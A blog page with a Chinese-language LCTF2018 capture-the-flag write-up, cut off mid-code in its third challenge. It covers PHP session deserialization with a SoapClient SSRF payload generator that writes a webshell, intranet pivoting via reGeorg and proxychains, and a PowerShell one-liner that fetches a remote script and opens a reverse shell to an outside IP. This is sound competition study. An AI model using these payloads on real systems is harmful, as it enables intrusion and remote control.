@@ -1,0 +1,817 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next pisces use-motion" lang="zh-hk">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="反序列化,代码审计," />
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="很害怕关环境，通宵了一晚把题目基本复现了一遍。 bestphp’s revengeXCTF FINAL bestphp的出题人的又一力作，这次是升级版。">
+<meta name="keywords" content="反序列化,代码审计">
+<meta property="og:type" content="article">
+<meta property="og:title" content="LCTF2018-writeup">
+<meta property="og:url" content="http://yoursite.com/2018/11/20/LCTF2018-writeup/index.html">
+<meta property="og:site_name" content="C0mRaDe&#39;s Blog">
+<meta property="og:description" content="很害怕关环境，通宵了一晚把题目基本复现了一遍。 bestphp’s revengeXCTF FINAL bestphp的出题人的又一力作，这次是升级版。">
+<meta property="og:locale" content="zh-hk">
+<meta property="og:image" content="https://www.github.com/coomrade/Img/raw/master/pics/1542646909122.png">
+<meta property="og:image" content="https://www.github.com/coomrade/Img/raw/master/pics/1542645841235.png">
+<meta property="og:image" content="https://www.github.com/coomrade/Img/raw/master/pics/1542645850655.png">
+<meta property="og:image" content="https://www.github.com/coomrade/Img/raw/master/pics/1542645870177.png">
+<meta property="og:image" content="https://www.github.com/coomrade/Img/raw/master/pics/1542646391624.png">
+<meta property="og:image" content="https://www.github.com/coomrade/Img/raw/master/pics/1542646712864.png">
+<meta property="og:image" content="https://www.github.com/coomrade/Img/raw/master/pics/1542647244367.png">
+<meta property="og:image" content="https://www.github.com/coomrade/Img/raw/master/pics/1542647614588.png">
+<meta property="og:image" content="https://www.github.com/coomrade/Img/raw/master/pics/1542647787250.png">
+<meta property="og:image" content="https://www.github.com/coomrade/Img/raw/master/pics/1542647830136.png">
+<meta property="og:image" content="https://www.github.com/coomrade/Img/raw/master/pics/1542648808563.png">
+<meta property="og:image" content="https://www.github.com/coomrade/Img/raw/master/pics/1542648850787.png">
+<meta property="og:image" content="https://www.github.com/coomrade/Img/raw/master/pics/1542648602278.png">
+<meta property="og:image" content="https://www.github.com/coomrade/Img/raw/master/pics/1542648727691.png">
+<meta property="og:image" content="https://www.github.com/coomrade/Img/raw/master/pics/1542649355544.png">
+<meta property="og:image" content="https://www.github.com/coomrade/Img/raw/master/pics/1542649695669.png">
+<meta property="og:image" content="https://www.github.com/coomrade/Img/raw/master/pics/1542649849883.png">
+<meta property="og:image" content="https://www.github.com/coomrade/Img/raw/master/pics/1542650052596.png">
+<meta property="og:image" content="https://www.github.com/coomrade/Img/raw/master/pics/1542650104982.png">
+<meta property="og:image" content="https://www.github.com/coomrade/Img/raw/master/pics/1542650263015.png">
+<meta property="og:image" content="https://www.github.com/coomrade/Img/raw/master/pics/1542663936563.png">
+<meta property="og:image" content="https://www.github.com/coomrade/Img/raw/master/pics/1542664646420.png">
+<meta property="og:image" content="https://www.github.com/coomrade/Img/raw/master/pics/1542664947176.png">
+<meta property="og:image" content="https://www.github.com/coomrade/Img/raw/master/pics/1542665037199.png">
+<meta property="og:image" content="https://www.github.com/coomrade/Img/raw/master/pics/1542665361158.png">
+<meta property="og:image" content="https://www.github.com/coomrade/Img/raw/master/pics/1542665936017.png">
+<meta property="og:image" content="https://www.github.com/coomrade/Img/raw/master/pics/1542666398560.png">
+<meta property="og:image" content="https://www.github.com/coomrade/Img/raw/master/pics/1542650677828.png">
+<meta property="og:image" content="https://www.github.com/coomrade/Img/raw/master/pics/1542650911398.png">
+<meta property="og:image" content="https://www.github.com/coomrade/Img/raw/master/pics/1542651076642.png">
+<meta property="og:image" content="https://www.github.com/coomrade/Img/raw/master/pics/1542651894543.png">
+<meta property="og:image" content="https://www.github.com/coomrade/Img/raw/master/pics/1542654250681.png">
+<meta property="og:image" content="https://www.github.com/coomrade/Img/raw/master/pics/1542654727234.png">
+<meta property="og:image" content="https://www.github.com/coomrade/Img/raw/master/pics/1542657659504.png">
+<meta property="og:image" content="https://www.github.com/coomrade/Img/raw/master/pics/1542661178095.png">
+<meta property="og:image" content="https://www.github.com/coomrade/Img/raw/master/pics/1542661099820.png">
+<meta property="og:image" content="https://www.github.com/coomrade/Img/raw/master/pics/1542661127419.png">
+<meta property="og:image" content="https://www.github.com/coomrade/Img/raw/master/pics/1542662747517.png">
+<meta property="og:image" content="https://www.github.com/coomrade/Img/raw/master/pics/1542662760891.png">
+<meta property="og:image" content="https://www.github.com/coomrade/Img/raw/master/pics/1542663224084.png">
+<meta property="og:image" content="https://www.github.com/coomrade/Img/raw/master/pics/1542663400397.png">
+<meta property="og:image" content="https://www.github.com/coomrade/Img/raw/master/pics/1542655965898.png">
+<meta property="og:image" content="https://www.github.com/coomrade/Img/raw/master/pics/1542658039560.png">
+<meta property="og:image" content="https://www.github.com/coomrade/Img/raw/master/pics/1542657659504.png">
+<meta property="og:image" content="https://www.github.com/coomrade/Img/raw/master/pics/1542656338222.png">
+<meta property="og:image" content="https://www.github.com/coomrade/Img/raw/master/pics/1542656261265.png">
+<meta property="og:image" content="https://www.github.com/coomrade/Img/raw/master/pics/1542656597310.png">
+<meta property="og:image" content="https://www.github.com/coomrade/Img/raw/master/pics/1542656639034.png">
+<meta property="og:image" content="https://www.github.com/coomrade/Img/raw/master/pics/1542656953713.png">
+<meta property="og:image" content="https://www.github.com/coomrade/Img/raw/master/pics/1542658442296.png">
+<meta property="og:image" content="https://www.github.com/coomrade/Img/raw/master/pics/1542658625237.png">
+<meta property="og:updated_time" content="2018-11-19T22:28:56.369Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="LCTF2018-writeup">
+<meta name="twitter:description" content="很害怕关环境，通宵了一晚把题目基本复现了一遍。 bestphp’s revengeXCTF FINAL bestphp的出题人的又一力作，这次是升级版。">
+<meta name="twitter:image" content="https://www.github.com/coomrade/Img/raw/master/pics/1542646909122.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Pisces',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2018/11/20/LCTF2018-writeup/"/>
+
+
+
+
+
+  <title>LCTF2018-writeup | C0mRaDe's Blog</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-hk">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">C0mRaDe's Blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle">This is la vie en rose.</p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            首頁
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            歸檔
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/11/20/LCTF2018-writeup/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="C0mRaDe">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/gabe-crow.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="C0mRaDe's Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">LCTF2018-writeup</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">發表於</span>
+              
+              <time title="創建於" itemprop="dateCreated datePublished" datetime="2018-11-20T06:21:22+08:00">
+                2018-11-20
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分類於</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/信息安全/" itemprop="url" rel="index">
+                    <span itemprop="name">信息安全</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p>很害怕关环境，通宵了一晚把题目基本复现了一遍。</p>
+<h1 id="bestphp’s-revenge"><a href="#bestphp’s-revenge" class="headerlink" title="bestphp’s revenge"></a>bestphp’s revenge</h1><p>XCTF FINAL bestphp的出题人的又一力作，这次是升级版。<a id="more"></a><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"> &lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">$b = &apos;implode&apos;;</span><br><span class="line">call_user_func($_GET[f],$_POST);</span><br><span class="line">session_start();</span><br><span class="line">if(isset($_GET[name]))&#123;</span><br><span class="line">    $_SESSION[name] = $_GET[name];</span><br><span class="line">&#125;</span><br><span class="line">var_dump($_SESSION);</span><br><span class="line">$a = array(reset($_SESSION),&apos;welcome_to_the_lctf2018&apos;);</span><br><span class="line">call_user_func($b,$a);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
+<p>还发现一个<code>flag.php</code><img src="https://www.github.com/coomrade/Img/raw/master/pics/1542646909122.png" alt="enter description here">目的很明确了，SSRF，再加上后面提示了反序列化，更明确了，soap-&gt;ssrf.<br>这题用了两个<code>call_user_func</code>，说一下当时的思路，一开始想的是第一个<code>call_user_func</code>只能用来对b进行变量覆盖，因为不然的话后面的第二个<code>call_user_func</code>就废了，然后这里的这个session操作也看得很迷，想到过<code>soapclient</code>和利用序列化处理器，但是<code>soapclient</code>也还需要调用一个它没有的方法才能去调用<code>__call</code>方法,当时就没想出来。</p>
+<h2 id="session-start"><a href="#session-start" class="headerlink" title="session_start"></a>session_start</h2><p><code>session_start</code>可以传入数组来初始化并不是新鲜东西，<code>bestphp</code>就已经用了，这题也一样用到。</p>
+<h2 id="序列化处理器"><a href="#序列化处理器" class="headerlink" title="序列化处理器"></a>序列化处理器</h2><p>其实序列化处理器这个知识点我之前已经写过了。。但是并没有想起来，可以看看我之前的<a href="https://coomrade.github.io/2018/09/11/php-serialize-handler/" target="_blank" rel="noopener">文章</a>,这也是这题的关键点之一。这里不再赘述，简单写两个demo<img src="https://www.github.com/coomrade/Img/raw/master/pics/1542645841235.png" alt="enter description here"><img src="https://www.github.com/coomrade/Img/raw/master/pics/1542645850655.png" alt="enter description here"><img src="https://www.github.com/coomrade/Img/raw/master/pics/1542645870177.png" alt="enter description here">可以明显看出存储方式上的不同，而php默认的是前者，也就是默认的序列化处理器是<code>php</code>而不是<code>php_serialize</code>。<code>php</code>以<code>|</code>为分隔符，分隔开key和value，而<code>php_serialize</code>则是标准的<code>serialize</code>函数处理后的数据。这里利用两个处理器的差异可以进行一波反序列化的操作。比如，在处理器为<code>php_serialize</code>时，传入的name是<code>|C0mRaDe</code>，而下一次<code>session_start()</code>进行反序列化时，还是用的默认处理器<code>php</code>，就会把<code>C0mRaDe</code>当作是value去反序列化。<code>session_start</code>会反序列化的原因如下：<img src="https://www.github.com/coomrade/Img/raw/master/pics/1542646391624.png" alt="enter description here">所以，我们传入的name如果是<code>|</code>，就可以触发反序列化漏洞。</p>
+<h2 id="Soapclient"><a href="#Soapclient" class="headerlink" title="Soapclient"></a>Soapclient</h2><p>这个也不是什么新知识点了，我之前的另一篇<a href="https://coomrade.github.io/2018/10/26/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%94%BB%E5%87%BB%E9%9D%A2%E6%8B%93%E5%B1%95%E6%8F%90%E9%AB%98%E7%AF%87/#more" target="_blank" rel="noopener">文章</a>也提到过，这里也不赘述，原理就是这个<img src="https://www.github.com/coomrade/Img/raw/master/pics/1542646712864.png" alt="enter description here"></p>
+<h2 id="call-user-func"><a href="#call-user-func" class="headerlink" title="call_user_func"></a>call_user_func</h2><p>这个点看起来平平无奇，但是是我当时想soap这条路最想不通的。因为soap需要去调用它的一个不存在的方法才能触发反序列化漏洞，但是这里没地方给我调用啊。然后，来看一个demo<img src="https://www.github.com/coomrade/Img/raw/master/pics/1542647244367.png" alt="enter description here">没错。。当你传入一个数组的时候，<code>call_user_func</code>就变成了一个调用类方法的方法。<br>结合这三个点，这题就没啥问题了。先给一个生成soap反序列化payload的demo(from <a href="https://xz.aliyun.com/t/2148#toc-2" target="_blank" rel="noopener">wupco</a>)<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$target = <span class="string">'http://127.0.0.1/flag.php'</span>;</span><br><span class="line">$post_string = <span class="string">'1=file_put_contents("shell.php", "&lt;?php phpinfo();?&gt;");'</span>;</span><br><span class="line">$headers = <span class="keyword">array</span>(</span><br><span class="line">    <span class="string">'X-Forwarded-For: 127.0.0.1'</span>,</span><br><span class="line">    <span class="string">'Cookie: PHPSESSID=mvsjieeufj0idggkjd123zz'</span></span><br><span class="line">    );</span><br><span class="line">$b = <span class="keyword">new</span> SoapClient(<span class="keyword">null</span>,<span class="keyword">array</span>(<span class="string">'location'</span> =&gt; $target,<span class="string">'user_agent'</span>=&gt;<span class="string">'wupco^^Content-Type: application/x-www-form-urlencoded^^'</span>.join(<span class="string">'^^'</span>,$headers).<span class="string">'^^Content-Length: '</span>.(string)strlen($post_string).<span class="string">'^^^^'</span>.$post_string,<span class="string">'uri'</span>      =&gt; <span class="string">"aaab"</span>));</span><br><span class="line"></span><br><span class="line">$aaa = serialize($b);</span><br><span class="line"><span class="comment">// $aaa = str_replace('^^','%0d%0a',$aaa);</span></span><br><span class="line"><span class="comment">// $aaa = str_replace('&amp;','%26',$aaa);</span></span><br><span class="line"><span class="keyword">echo</span> $aaa.<span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">$aaa=urlencode($aaa);</span><br><span class="line">$aaa=str_replace(<span class="string">'%5E%5E'</span>, <span class="string">'%0d%0a'</span>, $aaa);</span><br><span class="line"><span class="keyword">echo</span> $aaa;</span><br><span class="line"></span><br><span class="line"><span class="comment">// $c=unserialize(urldecode($aaa));</span></span><br><span class="line"><span class="comment">// $c-&gt;ss();</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
+<p>step1:更改序列化处理器，并且传入要进行反序列化的payload<img src="https://www.github.com/coomrade/Img/raw/master/pics/1542647614588.png" alt="enter description here">step2:变量覆盖b，把<code>$_SESSION[&#39;name&#39;]</code>替换为<code>Soapclient</code><img src="https://www.github.com/coomrade/Img/raw/master/pics/1542647787250.png" alt="enter description here">step3:get flag.<img src="https://www.github.com/coomrade/Img/raw/master/pics/1542647830136.png" alt="enter description here"></p>
+<h1 id="God-of-domain-pentest"><a href="#God-of-domain-pentest" class="headerlink" title="God of domain-pentest"></a>God of domain-pentest</h1><p>description:</p>
+<blockquote>
+<p>windows域环境权限不好配，还请各位师傅高抬贵手，不要搅屎<br>c段只用到了0-20，不需要扫21-255，端口也只开放了常用端口。<br>web.lctf.com中有个域用户是web.lctf.com\buguake,密码是172.21.0.8的本地管理员密码 </p>
+</blockquote>
+<p>这个题cool得不行，Windows域渗透，Nu1L的大佬是全国唯一一队做出来的，膜。我看着wp弄了很久，也还是没有搞出来，但是还是记录一下我自己弄的过程。之前没怎么接触过内网渗透，所以这个部分完全是从一个小白的角度出发写的。</p>
+<h2 id="webshell"><a href="#webshell" class="headerlink" title="webshell"></a>webshell</h2><p>题目给了一个shell<img src="https://www.github.com/coomrade/Img/raw/master/pics/1542648808563.png" alt="enter description here">很多命令不能执行，<code>phpinfo</code>看一下，发现禁了很多函数<img src="https://www.github.com/coomrade/Img/raw/master/pics/1542648850787.png" alt="enter description here">根据出题人的<a href="http://pupiles.com/lctf2018.html" target="_blank" rel="noopener">wp</a>可以绕过强行getshell，但是我这里写另一个方法。</p>
+<h2 id="reGeorg与proxychains配合使用"><a href="#reGeorg与proxychains配合使用" class="headerlink" title="reGeorg与proxychains配合使用"></a>reGeorg与proxychains配合使用</h2><p>这里有两个必备的工具，一个是<a href="https://github.com/zsxsoft/reGeorg" target="_blank" rel="noopener">reGeorg</a>，另一个是<a href="https://github.com/rofl0r/proxychains-ng" target="_blank" rel="noopener">proxychains</a><code>proxychains</code>的安装:<code>./configure-&gt;make &amp;&amp; make install-&gt;cp ./src/proxychains.conf /etc/proxychains.conf</code>然后，修改<code>/etc/proxychains.conf</code>，配置socks代理<img src="https://www.github.com/coomrade/Img/raw/master/pics/1542648602278.png" alt="enter description here">然后运行<code>reGeorg</code><img src="https://www.github.com/coomrade/Img/raw/master/pics/1542648727691.png" alt="enter description here">成功的话，这时候其实你已经处在目标的内网环境当中。接下来只需要在命令前面加个<code>proxychains4</code>就可以了，比如<code>proxychains4 curl 123.207.99.17</code><img src="https://www.github.com/coomrade/Img/raw/master/pics/1542649355544.png" alt="enter description here">(来自题目IP)</p>
+<h2 id="进内网getshell"><a href="#进内网getshell" class="headerlink" title="进内网getshell"></a>进内网getshell</h2><p>我nmap了一下，失败了，我也很绝望，不知道为什么。但是不要紧，我有wp，wp说<code>172.21.0.8</code>有<code>phpmyadmin</code>，那我赶紧去写个shell。<img src="https://www.github.com/coomrade/Img/raw/master/pics/1542649695669.png" alt="enter description here"><img src="https://www.github.com/coomrade/Img/raw/master/pics/1542649849883.png" alt="enter description here"><img src="https://www.github.com/coomrade/Img/raw/master/pics/1542650052596.png" alt="enter description here">然后拿到webshell<img src="https://www.github.com/coomrade/Img/raw/master/pics/1542650104982.png" alt="enter description here">参考了这篇<a href="https://www.anquanke.com/post/id/99793" target="_blank" rel="noopener">文章</a>，用这个payload可以反弹shell。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell IEX (New-Object Net.WebClient).DownloadString(&apos;https://raw.githubusercontent.com/samratashok/nishang/9a3c747bcf535ef82dc4c5c66aac36db47c2afde/Shells/Invoke-PowerShellTcp.ps1&apos;);Invoke-PowerShellTcp -Reverse -IPAddress 123.207.99.17 -port 2333</span><br></pre></td></tr></table></figure></p>
+<p><img src="https://www.github.com/coomrade/Img/raw/master/pics/1542650263015.png" alt="enter description here">接下来的步骤我不会了，即使看了wp我也不知道他在干嘛，这题就先到这里。。内网渗透也是个大学问啊</p>
+<h1 id="T4lk-1s-ch34p-sh0w-m3-the-sh31l"><a href="#T4lk-1s-ch34p-sh0w-m3-the-sh31l" class="headerlink" title="T4lk 1s ch34p,sh0w m3 the sh31l"></a>T4lk 1s ch34p,sh0w m3 the sh31l</h1><p>description:</p>
+<blockquote>
+<p>It’s a hacker game ,the wonderful hacker can pwn it.<br><a href="http://212.64.7.171/" target="_blank" rel="noopener">http://212.64.7.171/</a><br>ps:The only way you can get the flag is to use grep to check all the folders in the /</p>
+</blockquote>
+<p>题目环境已关，本地复现，这题是我LCTF第一天做出来的唯一一题，太菜了Orz。<br>进来题目之后有个很酷的前端<img src="https://www.github.com/coomrade/Img/raw/master/pics/1542663936563.png" alt="enter description here">点进去就开始代码审计<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">$SECRET  = `../read_secret`;                                  </span><br><span class="line">$SANDBOX = <span class="string">"../data/"</span> . md5($SECRET. $_SERVER[<span class="string">"REMOTE_ADDR"</span>]);</span><br><span class="line">$FILEBOX = <span class="string">"../file/"</span> . md5(<span class="string">"K0rz3n"</span>. $_SERVER[<span class="string">"REMOTE_ADDR"</span>]);   </span><br><span class="line">@mkdir($SANDBOX);</span><br><span class="line">@mkdir($FILEBOX);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>($_COOKIE[<span class="string">"session-data"</span>])) &#123;</span><br><span class="line">    $data = serialize(<span class="keyword">new</span> User($SANDBOX));</span><br><span class="line">    $hmac = hash_hmac(<span class="string">"md5"</span>, $data, $SECRET);</span><br><span class="line">    setcookie(<span class="string">"session-data"</span>, sprintf(<span class="string">"%s-----%s"</span>, $data, $hmac));      </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $avatar;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($path)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;avatar = $path;                                          </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">K0rz3n_secret_flag</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> $file_path;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">'/(log|etc|session|proc|data|read_secret|history|class|\.\.)/i'</span>, <span class="keyword">$this</span>-&gt;file_path))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"Sorry Sorry Sorry"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="keyword">include_once</span>(<span class="keyword">$this</span>-&gt;file_path);</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check_session</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">global</span> $SECRET;</span><br><span class="line">    $data = $_COOKIE[<span class="string">"session-data"</span>];</span><br><span class="line">    <span class="keyword">list</span>($data, $hmac) = explode(<span class="string">"-----"</span>, $data, <span class="number">2</span>);</span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">isset</span>($data, $hmac) || !is_string($data) || !is_string($hmac))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"Bye"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( !hash_equals(hash_hmac(<span class="string">"md5"</span>, $data, $SECRET), $hmac) )&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"Bye Bye"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    $data = unserialize($data);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ( !<span class="keyword">isset</span>($data-&gt;avatar) )&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"Bye Bye Bye"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> $data-&gt;avatar;                                               </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">upload</span><span class="params">($path)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span 